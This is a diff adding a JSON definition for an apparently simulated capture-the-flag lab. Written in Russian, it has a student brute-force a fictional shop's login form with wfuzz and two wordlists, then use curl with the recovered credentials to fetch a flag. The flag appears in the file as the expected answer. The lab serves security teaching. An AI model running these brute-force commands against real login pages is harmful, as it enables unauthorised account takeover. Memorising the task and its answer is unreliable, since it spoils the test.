@@ -1,0 +1,53 @@
+{
+  "id": "web-tool-wfuzz-burp-intruder",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{wfuzz_c0mb0_br34ks_th3_l0g1n}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: wfuzz — две позиции сразу\n\nЦель — форма входа `https://shop.acme-lab.test/login` (POST, поля `user` и\n`pass`). Одним словарём пару логин-пароль не перебрать: нужны **два** источника\npayload (`FUZZ` и `FUZ2Z`). Словари — `users.txt` и `pass.txt`.\n\n1. Перебор декартова произведения:\n   `wfuzz -z file,users.txt:FUZZ -z file,pass.txt:FUZ2Z -d 'user=FUZZ&pass=FUZ2Z' -u https://shop.acme-lab.test/login --hc 200`\n2. В выводе найди строку с `C=200` — это верная пара (`admin:hunter2`).\n3. Войди с ней и забери флаг:\n   `curl -s -X POST https://shop.acme-lab.test/login -d 'user=admin&pass=hunter2' | grep 'nto{' > found.txt`\n4. Набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/users.txt",
+      "text": "admin\nbob\ncarol\n"
+    },
+    {
+      "path": "/home/student/task/pass.txt",
+      "text": "password\n123456\nhunter2\nqwerty\n"
+    }
+  ],
+  "tools": {
+    "wfuzz": {
+      "help": "wfuzz -z file,<словарь>:FUZZ [-z ...:FUZ2Z] -u <url> -d '<тело>' [--hc N] — фаззер с несколькими payload",
+      "cases": [
+        {
+          "match": "pass\\.txt",
+          "example": "-z file,users.txt:FUZZ -z file,pass.txt:FUZ2Z -d 'user=FUZZ&pass=FUZ2Z' -u https://shop.acme-lab.test/login --hc 200",
+          "output": "********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: https://shop.acme-lab.test/login\nTotal requests: 12\n\n===================================================================\nID           Response   Lines    Word     Chars       Payload\n===================================================================\n\n000000003:   401        5 L      10 W     140 Ch      \"admin - 123456\"\n000000006:   401        5 L      10 W     140 Ch      \"admin - password\"\n000000012:   200        6 L      12 W     180 Ch      \"admin - hunter2\"\n\nTotal time: 0.51231\n"
+        }
+      ],
+      "fallback": "wfuzz: в этой лабе эмулируется только перебор https://shop.acme-lab.test/login.\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.acme-lab.test)",
+      "cases": [
+        {
+          "match": "pass=hunter2",
+          "example": "-s -X POST https://shop.acme-lab.test/login -d 'user=admin&pass=hunter2'",
+          "output": "{\"ok\":true,\"user\":\"admin\",\"role\":\"admin\",\"flag\":\"nto{wfuzz_c0mb0_br34ks_th3_l0g1n}\"}\n"
+        },
+        {
+          "match": "login",
+          "example": "-s -X POST https://shop.acme-lab.test/login -d 'user=admin&pass=wrong'",
+          "output": "{\"ok\":false,\"error\":\"invalid credentials\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только POST https://shop.acme-lab.test/login.\n"
+    }
+  }
+}
